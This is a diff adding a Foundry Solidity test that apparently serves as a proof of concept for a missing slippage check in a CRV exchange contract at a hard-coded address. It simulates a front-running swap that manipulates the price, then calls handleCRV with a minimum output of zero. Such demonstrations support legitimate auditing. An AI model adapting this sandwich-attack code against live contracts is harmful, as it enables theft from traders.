@@ -1,0 +1,141 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+interface ICRVExchange {
+    function crv_token() external view returns (address);
+    function path_indexes(uint256) external view returns (bytes32);
+    function path_from_addr(uint256) external view returns (address);
+    function path_to_addr(uint256) external view returns (address);
+    function paths(bytes32) external view returns (address dex, address[] memory path);
+    function handleCRV(address target_token, uint256 amount, uint256 min_amount) external;
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+    function allowance(address, address) external view returns (uint256);
+    function approve(address, uint256) external returns (bool);
+    function transferFrom(address, address, uint256) external returns (bool);
+}
+
+interface IUniswapV2Router {
+    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
+}
+
+interface CFETHControllerInterfaceForEx {
+    function refundTarget() external payable;
+}
+interface CFControllerInterfaceForEx {
+    function refundTarget(uint256 _amount) external;
+}
+
+contract Exploiter is CFControllerInterfaceForEx, CFETHControllerInterfaceForEx {
+    address public owner;
+    constructor() {
+        owner = msg.sender;
+    }
+    function refundTarget(uint256 _amount) external {
+        IERC20(msg.sender).transfer(owner, _amount);
+    }
+    function refundTarget() external payable {
+        payable(owner).transfer(address(this).balance);
+    }
+    function execute(address exchange, address target_token, uint256 amount, uint256 min_amount) external {
+        ICRVExchange(exchange).handleCRV(target_token, amount, min_amount);
+    }
+    receive() external payable {}
+}
+
+contract ExploitTest is Test {
+    address constant EXCHANGE = 0x65ff67d6a61ae6bab8821c584f5f394d35e9b50e;
+    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+
+    ICRVExchange exchange;
+    IERC20 crv;
+    Exploiter exploiter;
+    address dex;
+    address[] path;
+    uint256 amountIn = 1000e18; // 1000 CRV
+    uint256 expectedETHWithoutManipulation;
+
+    function setUp() public {
+        exchange = ICRVExchange(EXCHANGE);
+        crv = IERC20(exchange.crv_token());
+        exploiter = new Exploiter();
+
+        vm.label(EXCHANGE, "CRVExchange");
+        vm.label(address(crv), "CRV");
+        vm.label(WETH, "WETH");
+        vm.label(address(exploiter), "Exploiter");
+
+        // Find a valid path from CRV to WETH
+        uint256 pi = 0;
+        bool found = false;
+        while (true) {
+            try exchange.path_from_addr(pi) returns (address from) {
+                try exchange.path_to_addr(pi) returns (address to) {
+                    if (from == address(crv) && to == WETH) {
+                        bytes32 hash = exchange.path_indexes(pi);
+                        (dex, path) = exchange.paths(hash);
+                        found = true;
+                        break;
+                    }
+                } catch {}
+                pi++;
+            } catch {
+                break;
+            }
+        }
+        require(found, "No valid path from CRV to WETH found in exchange");
+        vm.label(dex, "DEX");
+
+        // Compute expected output without any price manipulation
+        uint256[] memory outs = IUniswapV2Router(dex).getAmountsOut(amountIn, path);
+        expectedETHWithoutManipulation = outs[outs.length - 1];
+    }
+
+    function testExploitNoSlippageCheck() public {
+        // Fund the exploiter with CRV
+        deal(address(crv), address(exploiter), amountIn);
+
+        // Approve exchange to spend CRV from exploiter
+        vm.prank(address(exploiter));
+        crv.approve(EXCHANGE, amountIn);
+
+        // Front-run: swap a large amount of CRV to WETH to manipulate the price
+        address frontRunner = address(0x123456789);
+        uint256 frontRunAmount = 100_000e18;
+        deal(address(crv), frontRunner, frontRunAmount);
+        vm.startPrank(frontRunner);
+        crv.approve(dex, frontRunAmount);
+        IUniswapV2Router(dex).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            frontRunAmount, 0, path, frontRunner, block.timestamp + 1000
+        );
+        vm.stopPrank();
+
+        // Record ETH balance before exploit
+        uint256 balanceBefore = address(this).balance;
+
+        // Exploiter calls handleCRV with min_amount = 0 (no slippage protection)
+        vm.prank(address(exploiter));
+        exploiter.execute(EXCHANGE, WETH, amountIn, 0);
+
+        // ETH received by owner (this contract) via refundTarget
+        uint256 actualETHReceived = address(this).balance - balanceBefore;
+
+        // Ensure the trade actually went through
+        assertGt(actualETHReceived, 0, "No ETH received from swap");
+
+        // Due to the front-run, the user should have received significantly less ETH than without it
+        // (slippage impact; min_amount=0 allowed the bad rate)
+        assertLt(actualETHReceived, expectedETHWithoutManipulation * 95 / 100,
+            "Slippage protection missing: user received more than expected despite front-run");
+    }
+}
+```
